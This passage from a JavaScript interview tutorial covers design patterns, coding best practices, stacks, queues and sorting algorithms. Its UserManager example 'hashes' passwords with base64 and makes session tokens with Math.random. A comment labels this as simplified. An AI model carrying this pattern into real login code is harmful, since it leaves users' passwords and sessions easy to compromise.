- **Live Video/Audio Streaming:** Real-time media transmission

### WebSocket vs HTTP:

| Feature | WebSocket | HTTP |
|---------|-----------|------|
| Connection | Persistent, bidirectional | Request-response, stateless |
| Overhead | Low (after handshake) | High (headers with each request) |
| Real-time | Excellent | Requires polling |
| Server Push | Native support | Not supported (needs SSE or polling) |
| Use Case | Real-time apps | Traditional web pages, APIs |

### Security Considerations:

- Use **WSS (WebSocket Secure)** for encrypted connections: `wss://example.com`
- Validate and sanitize all incoming messages
- Implement authentication and authorization
- Set up rate limiting to prevent abuse
- Use origin checking to prevent cross-site WebSocket hijacking
- Implement proper error handling and connection timeouts




# JavaScript Patterns and Best Practices (61-65)


## 61. What is a design pattern in JavaScript?

A **design pattern** is a reusable, proven solution to a commonly occurring problem in software design. Design patterns are templates or best practices that provide structured approaches to solving specific coding challenges, making code more maintainable, scalable, and easier to understand.

### Why Use Design Patterns?

- **Reusability:** Solve common problems with tested solutions
- **Maintainability:** Create code that's easier to understand and modify
- **Communication:** Provide a common vocabulary for developers
- **Best Practices:** Implement industry-standard approaches
- **Scalability:** Build applications that can grow efficiently
- **Code Organization:** Structure code in logical, predictable ways

### Categories of JavaScript Design Patterns:

**Creational Patterns** (Object creation mechanisms):
- Singleton: Ensures only one instance of a class exists
- Factory: Creates objects without specifying exact class
- Constructor: Uses constructor functions to create objects
- Prototype: Creates objects based on a prototype template

**Structural Patterns** (Object composition):
- Module: Encapsulates code into reusable modules
- Decorator: Adds functionality to objects dynamically
- Facade: Provides simplified interface to complex systems
- Proxy: Controls access to objects

**Behavioral Patterns** (Communication between objects):
- Observer: Notifies multiple objects of state changes
- Strategy: Defines family of algorithms, makes them interchangeable
- Command: Encapsulates requests as objects
- Iterator: Accesses elements of collection sequentially

### Simple Example - Observer Pattern:

```javascript
class Subject {
  constructor() {
    this.observers = [];
  }

  subscribe(observer) {
    this.observers.push(observer);
  }

  unsubscribe(observer) {
    this.observers = this.observers.filter(obs => obs !== observer);
  }

  notify(data) {
    this.observers.forEach(observer => observer.update(data));
  }
}

class Observer {
  update(data) {
    console.log('Received update:', data);
  }
}

// Usage
const subject = new Subject();
const observer1 = new Observer();
const observer2 = new Observer();

subject.subscribe(observer1);
subject.subscribe(observer2);
subject.notify('Hello observers!'); // Both observers receive the update
```

## 62. Can you explain the module pattern?

The **Module Pattern** is a design pattern that encapsulates code into self-contained units with private and public members, providing data privacy and preventing global namespace pollution. It uses closures to create private scope while exposing only necessary functionality.

### Key Features:

- **Encapsulation:** Groups related code together
- **Privacy:** Creates private variables and functions
- **Public Interface:** Exposes only selected methods and properties
- **Namespace Management:** Avoids polluting global scope
- **Organization:** Keeps code structured and maintainable

### Basic Module Pattern:

```javascript
const UserModule = (function() {
  // Private variables and functions
  let users = [];
  let idCounter = 0;

  function generateId() {
    return ++idCounter;
  }

  function validateUser(user) {
    return user.name && user.email;
  }

  // Public API
  return {
    addUser: function(name, email) {
      const user = {
        id: generateId(),
        name: name,
        email: email
      };

      if (validateUser(user)) {
        users.push(user);
        return user;
      }
      throw new Error('Invalid user data');
    },

    getUser: function(id) {
      return users.find(user => user.id === id);
    },

    getAllUsers: function() {
      return [...users]; // Return copy to prevent direct manipulation
    },

    removeUser: function(id) {
      users = users.filter(user => user.id !== id);
    },

    getUserCount: function() {
      return users.length;
    }
  };
})();

// Usage
UserModule.addUser('John Doe', 'john@example.com');
UserModule.addUser('Jane Smith', 'jane@example.com');
console.log(UserModule.getAllUsers()); // Works
console.log(UserModule.users); // undefined - private variable
console.log(UserModule.generateId); // undefined - private function
```

### Module Pattern with Parameters:

```javascript
const Calculator = (function(initialValue) {
  let result = initialValue || 0;

  return {
    add: function(x) {
      result += x;
      return this; // Enable method chaining
    },

    subtract: function(x) {
      result -= x;
      return this;
    },

    multiply: function(x) {
      result *= x;
      return this;
    },

    divide: function(x) {
      if (x !== 0) {
        result /= x;
      }
      return this;
    },

    getResult: function() {
      return result;
    },

    reset: function() {
      result = 0;
      return this;
    }
  };
})(10);

// Usage with method chaining
const value = Calculator.add(5).multiply(2).subtract(10).getResult();
console.log(value); // 20
```

### Advantages:

- Clean separation between private and public code
- Prevents variable naming conflicts
- Mimics class-like structure in pre-ES6 JavaScript
- Easy to understand and maintain
- Protects data integrity

### Disadvantages:

- Cannot easily extend or inherit from modules
- Private members are inaccessible for testing
- Creates new copies of functions for each instance
- Can be overkill for simple utilities

## 63. What is the Singleton pattern in JavaScript?

The **Singleton Pattern** ensures that a class has only one instance throughout the application and provides a global point of access to that instance. It's useful when exactly one object is needed to coordinate actions across the system.

### Key Characteristics:

- Only one instance can exist
- Provides global access point
- Instance is created lazily (on first use)
- Prevents direct instantiation
- Maintains single state across application

### ES6 Class Implementation:

```javascript
class DatabaseConnection {
  constructor() {
    if (DatabaseConnection.instance) {
      return DatabaseConnection.instance;
    }

    this.connected = false;
    this.host = 'localhost';
    this.port = 5432;
    
    DatabaseConnection.instance = this;
  }

  connect() {
    if (!this.connected) {
      console.log(`Connecting to ${this.host}:${this.port}...`);
      this.connected = true;
    }
    return this;
  }

  disconnect() {
    console.log('Disconnecting...');
    this.connected = false;
  }

  query(sql) {
    if (!this.connected) {
      throw new Error('Not connected to database');
    }
    console.log(`Executing query: ${sql}`);
  }
}

// Usage
const db1 = new DatabaseConnection();
const db2 = new DatabaseConnection();

console.log(db1 === db2); // true - same instance
db1.connect();
db2.query('SELECT * FROM users'); // Works because db1 and db2 are same instance
```

### Module Pattern Implementation:

```javascript
const Logger = (function() {
  let instance;
  let logCount = 0;

  function createLogger() {
    return {
      log: function(message) {
        logCount++;
        console.log(`[${new Date().toISOString()}] ${message}`);
      },

      error: function(message) {
        logCount++;
        console.error(`[${new Date().toISOString()}] ERROR: ${message}`);
      },

      getLogCount: function() {
        return logCount;
      }
    };
  }

  return {
    getInstance: function() {
      if (!instance) {
        instance = createLogger();
      }
      return instance;
    }
  };
})();

// Usage
const logger1 = Logger.getInstance();
const logger2 = Logger.getInstance();

logger1.log('First message');
logger2.log('Second message');

console.log(logger1 === logger2); // true
console.log(logger1.getLogCount()); // 2
```

### Modern ES6 Module Singleton:

```javascript
// config.js
class Configuration {
  constructor() {
    this.settings = {
      apiUrl: 'https://api.example.com',
      timeout: 5000,
      debug: false
    };
  }

  get(key) {
    return this.settings[key];
  }

  set(key, value) {
    this.settings[key] = value;
  }

  getAll() {
    return { ...this.settings };
  }
}

// Export single instance
export default new Configuration();

// Usage in other files
import config from './config.js';

console.log(config.get('apiUrl'));
config.set('debug', true);
```

### Freezing Singleton (Immutable):

```javascript
const AppSettings = (function() {
  const instance = {
    appName: 'MyApp',
    version: '1.0.0',
    environment: 'production',

    getInfo: function() {
      return `${this.appName} v${this.version} (${this.environment})`;
    }
  };

  // Freeze to prevent modifications
  Object.freeze(instance);

  return instance;
})();

// Usage
console.log(AppSettings.getInfo());
AppSettings.appName = 'ChangedApp'; // Won't work - frozen
console.log(AppSettings.appName); // Still 'MyApp'
```

### Common Use Cases:

- **Database Connections:** Single connection pool manager
- **Configuration Management:** Application-wide settings
- **Logging:** Centralized logging system
- **Caching:** Single cache instance
- **State Management:** Global application state
- **Thread Pools:** Managing limited resources
- **Device Managers:** Printer spooler, file system access

### Advantages:

- Controlled access to single instance
- Reduced memory usage
- Consistent global state
- Easy to manage shared resources
- Lazy initialization saves resources

### Disadvantages:

- Can make unit testing difficult
- Violates Single Responsibility Principle
- Can introduce hidden dependencies
- Difficult to subclass or extend
- May be overused when not necessary

## 64. Explain the Revealing Module pattern.

The **Revealing Module Pattern** is a variation of the Module Pattern that makes code more readable by defining all functions and variables in private scope, then returning an object literal that "reveals" only the public members with clearer, more descriptive names.

### Key Features:

- All members are defined as private by default
- Public API is clearly defined in return statement
- Provides cleaner and more consistent syntax
- Makes it obvious which members are public
- Easier to understand module's public interface
- Can rename private functions for public use

### Basic Implementation:

```javascript
const ShoppingCart = (function() {
  // All private members
  let items = [];
  let total = 0;

  function calculateTotal() {
    total = items.reduce((sum, item) => sum + (item.price * item.quantity), 0);
    return total;
  }

  function findItemIndex(productId) {
    return items.findIndex(item => item.id === productId);
  }

  function addItem(product, quantity) {
    const existingIndex = findItemIndex(product.id);
    
    if (existingIndex > -1) {
      items[existingIndex].quantity += quantity;
    } else {
      items.push({
        id: product.id,
        name: product.name,
        price: product.price,
        quantity: quantity
      });
    }
    
    calculateTotal();
  }

  function removeItem(productId) {
    const index = findItemIndex(productId);
    if (index > -1) {
      items.splice(index, 1);
      calculateTotal();
    }
  }

  function updateQuantity(productId, newQuantity) {
    const index = findItemIndex(productId);
    if (index > -1) {
      if (newQuantity <= 0) {
        removeItem(productId);
      } else {
        items[index].quantity = newQuantity;
        calculateTotal();
      }
    }
  }

  function getItems() {
    return items.map(item => ({ ...item })); // Return copies
  }

  function getTotal() {
    return total;
  }

  function clearCart() {
    items = [];
    total = 0;
  }

  function getItemCount() {
    return items.reduce((count, item) => count + item.quantity, 0);
  }

  // Reveal public interface
  return {
    add: addItem,
    remove: removeItem,
    updateQuantity: updateQuantity,
    getItems: getItems,
    getTotal: getTotal,
    clear: clearCart,
    getItemCount: getItemCount
  };
})();

// Usage
ShoppingCart.add({ id: 1, name: 'Laptop', price: 999 }, 1);
ShoppingCart.add({ id: 2, name: 'Mouse', price: 25 }, 2);
console.log(ShoppingCart.getTotal()); // 1049
console.log(ShoppingCart.getItemCount()); // 3
```

### Advanced Example with Private Communication:

```javascript
const UserManager = (function() {
  // Private state
  const users = new Map();
  let currentUser = null;

  // Private helper functions
  function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  }

  function hashPassword(password) {
    // Simplified - use proper hashing in production
    return btoa(password);
  }

  function generateToken() {
    return Math.random().toString(36).substring(2, 15);
  }

  // Private main functions
  function registerUser(email, password, name) {
    if (!validateEmail(email)) {
      throw new Error('Invalid email format');
    }

    if (users.has(email)) {
      throw new Error('User already exists');
    }

    const user = {
      email: email,
      password: hashPassword(password),
      name: name,
      createdAt: new Date(),
      token: null
    };

    users.set(email, user);
    return { email: user.email, name: user.name };
  }

  function loginUser(email, password) {
    const user = users.get(email);

    if (!user || user.password !== hashPassword(password)) {
      throw new Error('Invalid credentials');
    }

    user.token = generateToken();
    currentUser = user;
    return { token: user.token, name: user.name };
  }

  function logoutUser() {
    if (currentUser) {
      currentUser.token = null;
      currentUser = null;
    }
  }

  function getCurrentUser() {
    return currentUser ? {
      email: currentUser.email,
      name: currentUser.name
    } : null;
  }

  function isLoggedIn() {
    return currentUser !== null;
  }

  function getUserCount() {
    return users.size;
  }

  // Reveal public API with clear naming
  return {
    register: registerUser,
    login: loginUser,
    logout: logoutUser,
    getCurrentUser: getCurrentUser,
    isAuthenticated: isLoggedIn,
    getTotalUsers: getUserCount
  };
})();

// Usage
UserManager.register('john@example.com', 'password123', 'John Doe');
const session = UserManager.login('john@example.com', 'password123');
console.log(UserManager.isAuthenticated()); // true
console.log(UserManager.getCurrentUser()); // { email: '...', name: 'John Doe' }
```

### With ES6 Features:

```javascript
const TaskManager = (() => {
  // Private using const/let
  const tasks = [];
  let nextId = 1;

  const createTask = (title, description, priority = 'medium') => ({
    id: nextId++,
    title,
    description,
    priority,
    completed: false,
    createdAt: new Date()
  });

  const addTask = (title, description, priority) => {
    const task = createTask(title, description, priority);
    tasks.push(task);
    return task;
  };

  const completeTask = (taskId) => {
    const task = tasks.find(t => t.id === taskId);
    if (task) {
      task.completed = true;
      task.completedAt = new Date();
      return true;
    }
    return false;
  };

  const deleteTask = (taskId) => {
    const index = tasks.findIndex(t => t.id === taskId);
    if (index > -1) {
      tasks.splice(index, 1);
      return true;
    }
    return false;
  };

  const getTasks = (filter = 'all') => {
    switch(filter) {
      case 'completed':
        return tasks.filter(t => t.completed);
      case 'pending':
        return tasks.filter(t => !t.completed);
      default:
        return [...tasks];
    }
  };

  const getTaskById = (taskId) => {
    return tasks.find(t => t.id === taskId);
  };

  const getTasksByPriority = (priority) => {
    return tasks.filter(t => t.priority === priority);
  };

  // Reveal public interface
  return {
    add: addTask,
    complete: completeTask,
    delete: deleteTask,
    getAll: getTasks,
    getById: getTaskById,
    getByPriority: getTasksByPriority
  };
})();

// Usage
TaskManager.add('Buy groceries', 'Milk, eggs, bread', 'high');
TaskManager.add('Call dentist', 'Schedule appointment', 'medium');
console.log(TaskManager.getAll('pending'));
```

### Advantages Over Standard Module Pattern:

- **Clarity:** Public interface is explicitly defined in one place
- **Consistency:** All members follow same naming convention in private scope
- **Maintainability:** Easy to see what's public vs private
- **Flexibility:** Can expose private functions with different public names
- **Readability:** Code structure is more intuitive

### Disadvantages:

- Cannot override public methods from outside
- Changes to public/private members require editing return statement
- Slightly more verbose than standard module pattern
- Private functions cannot call public versions of themselves

### When to Use:

- Building reusable libraries or utilities
- Creating encapsulated components
- Managing complex state privately
- When clear public API is important
- Team projects where readability matters

## 65. What are some best practices for coding in JavaScript?

JavaScript best practices help create maintainable, efficient, and bug-free code. Here are essential guidelines every JavaScript developer should follow:

### Code Structure & Organization

**Use Meaningful Variable Names:**
```javascript
// Bad
const x = 5;
const d = new Date();

// Good
const itemCount = 5;
const currentDate = new Date();
```

**Use const and let, Avoid var:**
```javascript
// Bad
var name = 'John';

// Good
const API_KEY = 'abc123'; // Constants
let userCount = 0; // Variables that change
```

**Keep Functions Small and Focused:**
```javascript
// Bad - function does too much
function processUser(user) {
  validateUser(user);
  saveToDatabase(user);
  sendEmail(user);
  updateCache(user);
  logActivity(user);
}

// Good - single responsibility
function validateUser(user) { /* ... */ }
function saveUser(user) { /* ... */ }
function notifyUser(user) { /* ... */ }
```

### Modern JavaScript Features

**Use Arrow Functions When Appropriate:**
```javascript
// For callbacks and short functions
const numbers = [1, 2, 3, 4, 5];
const doubled = numbers.map(n => n * 2);

// For functions that need 'this' context, use regular functions
const obj = {
  value: 10,
  getValue: function() { // Not arrow function
    return this.value;
  }
};
```

**Use Template Literals:**
```javascript
// Bad
const greeting = 'Hello, ' + name + '! You have ' + count + ' messages.';

// Good
const greeting = `Hello, ${name}! You have ${count} messages.`;
```

**Use Destructuring:**
```javascript
// Object destructuring
const { firstName, lastName, age } = user;

// Array destructuring
const [first, second, ...rest] = numbers;

// Function parameters
function greet({ name, age }) {
  console.log(`${name} is ${age} years old`);
}
```

**Use Spread Operator:**
```javascript
// Copy arrays/objects
const newArray = [...oldArray];
const newObject = { ...oldObject, updatedField: 'new value' };

// Combine arrays
const combined = [...array1, ...array2];
```

### Error Handling

**Always Handle Errors:**
```javascript
// Use try-catch for synchronous code
try {
  const data = JSON.parse(jsonString);
  processData(data);
} catch (error) {
  console.error('Failed to parse JSON:', error.message);
  // Handle error appropriately
}

// Use .catch() for promises
fetch('/api/data')
  .then(response => response.json())
  .then(data => processData(data))
  .catch(error => console.error('Request failed:', error));

// Use try-catch with async/await
async function fetchData() {
  try {
    const response = await fetch('/api/data');
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Error fetching data:', error);
    throw error; // Re-throw if needed
  }
}
```

### Code Quality

**Validate Input:**
```javascript
function calculateDiscount(price, percentage) {
  if (typeof price !== 'number' || price < 0) {
    throw new Error('Invalid price');
  }
  if (typeof percentage !== 'number' || percentage < 0 || percentage > 100) {
    throw new Error('Invalid percentage');
  }
  return price * (percentage / 100);
}
```

**Use Strict Equality:**
```javascript
// Bad
if (value == '10') { } // Type coercion

// Good
if (value === 10) { } // Strict equality
```

**Avoid Global Variables:**
```javascript
// Bad
var globalCounter = 0;

// Good - use modules or closures
const Counter = (function() {
  let count = 0;
  return {
    increment: () => ++count,
    getCount: () => count
  };
})();
```

**Use Default Parameters:**
```javascript
function createUser(name, role = 'user', active = true) {
  return { name, role, active };
}
```

### Performance Optimization

**Debounce Expensive Operations:**
```javascript
function debounce(func, delay) {
  let timeoutId;
  return function(...args) {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => func.apply(this, args), delay);
  };
}

// Usage
const searchInput = document.getElementById('search');
searchInput.addEventListener('input', debounce(performSearch, 300));
```

**Use Event Delegation:**
```javascript
// Bad - multiple listeners
document.querySelectorAll('.button').forEach(btn => {
  btn.addEventListener('click', handleClick);
});

// Good - single listener
document.getElementById('container').addEventListener('click', (e) => {
  if (e.target.classList.contains('button')) {
    handleClick(e);
  }
});
```

**Avoid Memory Leaks:**
```javascript
// Remove event listeners when done
const handleClick = () => console.log('clicked');
element.addEventListener('click', handleClick);

// Later, when cleaning up
element.removeEventListener('click', handleClick);

// Clear timers
const timerId = setInterval(doSomething, 1000);
clearInterval(timerId); // When done
```

### Asynchronous Code

**Prefer async/await Over Promise Chains:**
```javascript
// Less readable
function getUserData() {
  return fetch('/api/user')
    .then(response => response.json())
    .then(user => fetch(`/api/posts/${user.id}`))
    .then(response => response.json());
}

// More readable
async function getUserData() {
  const userResponse = await fetch('/api/user');
  const user = await userResponse.json();
  const postsResponse = await fetch(`/api/posts/${user.id}`);
  return postsResponse.json();
}
```

### Code Documentation

**Write Clear Comments:**
```javascript
// Bad
// increment i
i++;

// Good - explain why, not what
// Skip first element as it's a header row
for (let i = 1; i < data.length; i++) { }

// Use JSDoc for functions
/**
 * Calculates the total price including tax
 * @param {number} price - The base price
 * @param {number} taxRate - Tax rate as decimal (e.g., 0.08 for 8%)
 * @returns {number} Total price with tax
 */
function calculateTotal(price, taxRate) {
  return price * (1 + taxRate);
}
```

### Security Best Practices

**Sanitize User Input:**
```javascript
// Escape HTML to prevent XSS
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// Never use eval()
// Bad
eval(userInput);

// Good - use JSON.parse for JSON, proper parsing for others
JSON.parse(jsonString);
```

**Use Environment Variables for Secrets:**
```javascript
// Don't hardcode API keys
// Bad
const API_KEY = 'sk_live_abc123xyz';

// Good - use environment variables
const API_KEY = process.env.API_KEY;
```

### Testing & Debugging

**Write Testable Code:**
```javascript
// Bad - hard to test
function processAndDisplay() {
  const data = fetchData();
  const processed = processData(data);
  updateDOM(processed);
}

// Good - separate concerns
function fetchData() { /* ... */ }
function processData(data) { /* ... */ }
function updateDOM(data) { /* ... */ }

// Can test each function independently
```

**Use Console Methods Effectively:**
```javascript
console.log('Debug info'); // Basic logging
console.error('Error occurred'); // Errors
console.warn('Warning message'); // Warnings
console.table(arrayOfObjects); // Tabular data
console.time('operation'); // Start timer
// ... code ...
console.timeEnd('operation'); // End timer and log duration
```

### General Guidelines

- Use linters (ESLint) and formatters (Prettier)
- Follow a consistent code style guide
- Keep dependencies up to date
- Write modular, reusable code
- Use version control (Git) properly
- Comment complex logic, not obvious code
- Optimize for readability first, performance second
- Write unit tests for critical functionality
- Handle edge cases and null/undefined values
- Use TypeScript for large projects
- Keep learning and stay updated with new features




# JavaScript Algorithms and Data Structures (66-70)

## 66. How do you implement a stack and a queue in JavaScript?

**Stack** and **Queue** are fundamental data structures. A stack follows Last-In-First-Out (LIFO) principle, while a queue follows First-In-First-Out (FIFO) principle.

### Stack Implementation

A stack supports push (add to top) and pop (remove from top) operations.

**Using Array Methods:**

```javascript
class Stack {
  constructor() {
    this.items = [];
  }

  // Add element to top of stack
  push(element) {
    this.items.push(element);
  }

  // Remove and return top element
  pop() {
    if (this.isEmpty()) {
      return null;
    }
    return this.items.pop();
  }

  // View top element without removing
  peek() {
    if (this.isEmpty()) {
      return null;
    }
    return this.items[this.items.length - 1];
  }

  // Check if stack is empty
  isEmpty() {
    return this.items.length === 0;
  }

  // Get stack size
  size() {
    return this.items.length;
  }

  // Clear all elements
  clear() {
    this.items = [];
  }

  // Print stack contents
  print() {
    console.log(this.items.toString());
  }
}

// Usage
const stack = new Stack();
stack.push(10);
stack.push(20);
stack.push(30);
console.log(stack.peek()); // 30
console.log(stack.pop()); // 30
console.log(stack.size()); // 2
```

**Using Linked List (More Efficient):**

```javascript
class Node {
  constructor(value) {
    this.value = value;
    this.next = null;
  }
}

class LinkedListStack {
  constructor() {
    this.top = null;
    this.length = 0;
  }

  push(value) {
    const newNode = new Node(value);
    newNode.next = this.top;
    this.top = newNode;
    this.length++;
  }

  pop() {
    if (this.isEmpty()) {
      return null;
    }
    const value = this.top.value;
    this.top = this.top.next;
    this.length--;
    return value;
  }

  peek() {
    return this.isEmpty() ? null : this.top.value;
  }

  isEmpty() {
    return this.length === 0;
  }

  size() {
    return this.length;
  }
}
```

**Real-World Stack Example (Undo Feature):**

```javascript
class TextEditor {
  constructor() {
    this.text = '';
    this.history = new Stack();
  }

  write(newText) {
    this.history.push(this.text);
    this.text += newText;
  }

  undo() {
    if (!this.history.isEmpty()) {
      this.text = this.history.pop();
    }
  }

  getText() {
    return this.text;
  }
}

// Usage
const editor = new TextEditor();
editor.write('Hello');
editor.write(' World');
console.log(editor.getText()); // "Hello World"
editor.undo();
console.log(editor.getText()); // "Hello"
```

### Queue Implementation

A queue supports enqueue (add to rear) and dequeue (remove from front) operations.

**Using Array Methods:**

```javascript
class Queue {
  constructor() {
    this.items = [];
  }

  // Add element to rear of queue
  enqueue(element) {
    this.items.push(element);
  }

  // Remove and return front element
  dequeue() {
    if (this.isEmpty()) {
      return null;
    }
    return this.items.shift();
  }

  // View front element without removing
  front() {
    if (this.isEmpty()) {
      return null;
    }
    return this.items[0];
  }

  // Check if queue is empty
  isEmpty() {
    return this.items.length === 0;
  }

  // Get queue size
  size() {
    return this.items.length;
  }

  // Clear all elements
  clear() {
    this.items = [];
  }

  // Print queue contents
  print() {
    console.log(this.items.toString());
  }
}

// Usage
const queue = new Queue();
queue.enqueue('First');
queue.enqueue('Second');
queue.enqueue('Third');
console.log(queue.front()); // "First"
console.log(queue.dequeue()); // "First"
console.log(queue.size()); // 2
```

**Optimized Queue Using Object (Better Performance):**

```javascript
class OptimizedQueue {
  constructor() {
    this.items = {};
    this.frontIndex = 0;
    this.rearIndex = 0;
  }

  enqueue(element) {
    this.items[this.rearIndex] = element;
    this.rearIndex++;
  }

  dequeue() {
    if (this.isEmpty()) {
      return null;
    }
    const item = this.items[this.frontIndex];
    delete this.items[this.frontIndex];
    this.frontIndex++;
    return item;
  }

  front() {
    return this.isEmpty() ? null : this.items[this.frontIndex];
  }

  isEmpty() {
    return this.rearIndex === this.frontIndex;
  }

  size() {
    return this.rearIndex - this.frontIndex;
  }

  clear() {
    this.items = {};
    this.frontIndex = 0;
    this.rearIndex = 0;
  }
}
```

**Circular Queue Implementation:**

```javascript
class CircularQueue {
  constructor(capacity) {
    this.items = new Array(capacity);
    this.capacity = capacity;
    this.front = -1;
    this.rear = -1;
    this.currentSize = 0;
  }

  isFull() {
    return this.currentSize === this.capacity;
  }

  isEmpty() {
    return this.currentSize === 0;
  }

  enqueue(element) {
    if (this.isFull()) {
      throw new Error('Queue is full');
    }

    this.rear = (this.rear + 1) % this.capacity;
    this.items[this.rear] = element;
    
    if (this.front === -1) {
      this.front = this.rear;
    }
    
    this.currentSize++;
  }

  dequeue() {
    if (this.isEmpty()) {
      return null;
    }

    const item = this.items[this.front];
    this.items[this.front] = null;
    this.front = (this.front + 1) % this.capacity;
    this.currentSize--;

    if (this.isEmpty()) {
      this.front = -1;
      this.rear = -1;
    }

    return item;
  }

  peek() {
    return this.isEmpty() ? null : this.items[this.front];
  }

  size() {
    return this.currentSize;
  }
}
```

**Real-World Queue Example (Print Queue):**

```javascript
class PrintQueue {
  constructor() {
    this.queue = new Queue();
  }

  addDocument(document) {
    this.queue.enqueue({
      name: document,
      timestamp: new Date()
    });
    console.log(`Added "${document}" to print queue`);
  }

  printNext() {
    if (this.queue.isEmpty()) {
      console.log('No documents in queue');
      return;
    }

    const doc = this.queue.dequeue();
    console.log(`Printing: ${doc.name}`);
    console.log(`Queued at: ${doc.timestamp.toLocaleTimeString()}`);
  }

  viewQueue() {
    console.log(`Documents in queue: ${this.queue.size()}`);
  }
}

// Usage
const printer = new PrintQueue();
printer.addDocument('Report.pdf');
printer.addDocument('Invoice.docx');
printer.printNext(); // Prints "Report.pdf"
printer.viewQueue(); // 1 document remaining
```

### Comparison

| Feature | Stack | Queue |
|---------|-------|-------|
| Order | LIFO (Last-In-First-Out) | FIFO (First-In-First-Out) |
| Add Operation | push() - O(1) | enqueue() - O(1) |
| Remove Operation | pop() - O(1) | dequeue() - O(1) with object, O(n) with array |
| Access | Only top element | Only front element |
| Use Cases | Undo/redo, backtracking, expression evaluation | Task scheduling, breadth-first search, buffering |

## 67. Explain how to sort an array in JavaScript.

JavaScript provides multiple ways to sort arrays, from built-in methods to custom sorting algorithms.

### Built-in Array.sort() Method

**Basic Sorting:**

```javascript
// Sort strings alphabetically
const fruits = ['banana', 'apple', 'orange', 'mango'];
fruits.sort();
console.log(fruits); // ['apple', 'banana', 'mango', 'orange']

// Note: sort() modifies the original array
const numbers = [5, 2, 8, 1, 9];
numbers.sort();
console.log(numbers); // [1, 2, 5, 8, 9] - Works but...

// Problem with numbers (sorts as strings!)
const nums = [1, 2, 10, 21, 3];
nums.sort();
console.log(nums); // [1, 10, 2, 21, 3] - Wrong!
```

**Sorting Numbers with Compare Function:**

```javascript
const numbers = [10, 5, 40, 25, 1000, 1];

// Ascending order
numbers.sort((a, b) => a - b);
console.log(numbers); // [1, 5, 10, 25, 40, 1000]

// Descending order
numbers.sort((a, b) => b - a);
console.log(numbers); // [1000, 40, 25, 10, 5, 1]

// How it works:
// If return value < 0: a comes before b
// If return value > 0: b comes before a
// If return value === 0: order unchanged
```

**Sorting Objects:**

```javascript
const students = [
  { name: 'John', grade: 85 },
  { name: 'Alice', grade: 92 },
  { name: 'Bob', grade: 78 },
  { name: 'Eve', grade: 92 }
];

// Sort by grade (ascending)
students.sort((a, b) => a.grade - b.grade);

// Sort by name (alphabetically)
students.sort((a, b) => a.name.localeCompare(b.name));

// Sort by multiple criteria (grade descending, then name ascending)
students.sort((a, b) => {
  if (b.grade !== a.grade) {
    return b.grade - a.grade; // Sort by grade first
  }
  return a.name.localeCompare(b.name); // Then by name
});

console.log(students);
// [
//   { name: 'Alice', grade: 92 },
//   { name: 'Eve', grade: 92 },
//   { name: 'John', grade: 85 },
//   { name: 'Bob', grade: 78 }
// ]
```

**Case-Insensitive String Sorting:**

```javascript
const words = ['Zebra', 'apple', 'Banana', 'cherry'];

// Case-sensitive (default)
words.sort();
console.log(words); // ['Banana', 'Zebra', 'apple', 'cherry']

// Case-insensitive
words.sort((a, b) => a.toLowerCase().localeCompare(b.toLowerCase()));
console.log(words); // ['apple', 'Banana', 'cherry', 'Zebra']

// Using localeCompare with options
words.sort((a, b) => a.localeCompare(b, undefined, { sensitivity: 'base' }));
```

**Sorting Without Modifying Original Array:**

```javascript
const original = [3, 1, 4, 1, 5, 9, 2, 6];

// Method 1: Using spread operator
const sorted1 = [...original].sort((a, b) => a - b);

// Method 2: Using slice()
const sorted2 = original.slice().sort((a, b) => a - b);

// Method 3: Using Array.from()
const sorted3 = Array.from(original).sort((a, b) => a - b);

console.log(original); // [3, 1, 4, 1, 5, 9, 2, 6] - unchanged
console.log(sorted1); // [1, 1, 2, 3, 4, 5, 6, 9]
```

### Custom Sorting Algorithms

**Bubble Sort (O(n²)):**

```javascript
function bubbleSort(arr) {
  const n = arr.length;
  const array = [...arr]; // Don't modify original
  
  for (let i = 0; i < n - 1; i++) {
    let swapped = false;
    
    for (let j = 0; j < n - i - 1; j++) {
      if (array[j] > array[j + 1]) {
        // Swap elements
        [array[j], array[j + 1]] = [array[j + 1], array[j]];
        swapped = true;
      }
    }
    
    // If no swaps, array is sorted
    if (!swapped) break;
  }
  
  return array;
}

console.log(bubbleSort([64, 34, 25, 12, 22, 11, 90]));
// [11, 12, 22, 25, 34, 64, 90]
```

**Quick Sort (O(n log n) average):**

```javascript
function quickSort(arr) {
  if (arr.length <= 1) {
    return arr;
  }
  
  const pivot = arr[Math.floor(arr.length / 2)];
  const left = arr.filter(x => x < pivot);
  const middle = arr.filter(x => x === pivot);
  const right = arr.filter(x => x > pivot);
  
  return [...quickSort(left), ...middle, ...quickSort(right)];
}

console.log(quickSort([3, 6, 8, 10, 1, 2, 1]));
// [1, 1, 2, 3, 6, 8, 10]
```

**Merge Sort (O(n log n)):**

```javascript
function mergeSort(arr) {
  if (arr.length <= 1) {
    return arr;
  }
  
  const mid = Math.floor(arr.length / 2);
  const left = mergeSort(arr.slice(0, mid));
  const right = mergeSort(arr.slice(mid));
  
  return merge(left, right);
}

function merge(left, right) {
  const result = [];
  let leftIndex = 0;
  let rightIndex = 0;
  
  while (leftIndex < left.length && rightIndex < right.length) {
    if (left[leftIndex] < right[rightIndex]) {
      result.push(left[leftIndex]);
      leftIndex++;
    } else {
      result.push(right[rightIndex]);
      rightIndex++;
    }
  }
  
  return result.concat(left.slice(leftIndex)).concat(right.slice(rightIndex));
}

console.log(mergeSort([38, 27, 43, 3, 9, 82, 10]));
// [3, 9, 10, 27, 38, 43, 82]
```

**Selection Sort (O(n²)):**

```javascript
function selectionSort(arr) {
  const array = [...arr];
  const n = array.length;
  
  for (let i = 0; i < n - 1; i++) {
    let minIndex = i;
    
    for (let j = i + 1; j < n; j++) {
      if (array[j] < array[minIndex]) {
        minIndex = j;
      }
    }
    
    if (minIndex !== i) {
      [array[i], array[minIndex]] = [array[minIndex], array[i]];
    }
  }
  
  return array;
}
```

### Specialized Sorting Scenarios

**Sorting Dates:**

```javascript
const dates = [
  new Date('2023-05-15'),
  new Date('2022-01-10'),
  new Date('2024-03-20')
];

// Sort ascending
dates.sort((a, b) => a - b);

// Or explicitly
dates.sort((a, b) => a.getTime() - b.getTime());
```

**Sorting with null/undefined Values:**

```javascript
const data = [5, null, 3, undefined, 1, null, 7];

// Put nullish values at end
data.sort((a, b) => {
  if (a == null) return 1;
  if (b == null) return -1;
  return a - b;
});
